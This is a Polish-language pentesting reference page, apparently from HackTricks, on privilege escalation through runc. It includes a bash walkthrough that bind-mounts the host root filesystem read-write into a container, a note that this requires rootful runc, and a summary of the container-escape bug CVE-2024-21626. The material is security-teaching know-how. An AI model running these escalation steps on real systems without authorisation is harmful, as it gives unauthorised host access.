# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje podstawowe

Jeśli chcesz dowiedzieć się więcej o **runc**, sprawdź tę stronę:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Jeśli `runc` jest dostępny dla procesu rootful na hoście, możesz użyć OCI bundle, którego konfiguracja mount rekurencyjnie bind-mountuje hostowy `/` do `/` wewnątrz kontenera, udostępniając system plików hosta w tej przestrzeni nazw mount.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Udokumentowany workflow `runc run` działa w trybie rootful: w przykładach runc opisuje go jako „run as root”. Użytkownik bez uprawnień musi użyć konfiguracji rootless, takiej jak `runc spec --rootless`, a dokumentacja runc wskazuje, że w tym trybie muszą być włączone user namespaces.<sup>[[1]](#references)</sup>

## Uprzywilejowane wrappery i wersje runtime

Uprzywilejowany wrapper, który przyjmuje kontrolowany przez wywołującego pakiet OCI, może ujawniać pliki hosta, jeśli dopuszcza niebezpieczne bind mounts. Sprawdź, czy wrapper rozwiązuje ścieżki traversal i symlinki przed walidacją źródeł i miejsc docelowych montowania oraz czy ogranicza `process.cwd`. Sama reguła sudo lub zapisywalny `config.json` nie dowodzą, że wrapper zaakceptuje pakiet ani uruchomi go z uprawnieniami hosta.

Osobno, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) dotyczyło upstreamowych wersji `runc` od `1.0.0-rc93` do `1.1.11`; wersja `1.1.12` zawiera upstreamową poprawkę. Leaked file descriptors i niewystarczająca walidacja katalogu roboczego mogły spowodować, że proces kontenera znalazł się poza swoim rootem podczas niektórych workflow `runc run` lub `runc exec`. Numery file descriptorów zależą od sposobu wywołania, a sam numer wersji nie przesądza o podatności, jeśli dostawca backportował poprawki lub wywołujący nie może wpływać na wywołanie uprzywilejowanego runtime.

## References

- [1] [runc: narzędzie CLI do uruchamiania i obsługi kontenerów](https://github.com/opencontainers/runc#using-runc)
- [2] [Specyfikacja OCI Runtime: montowania](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Współdzielone poddrzewa](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
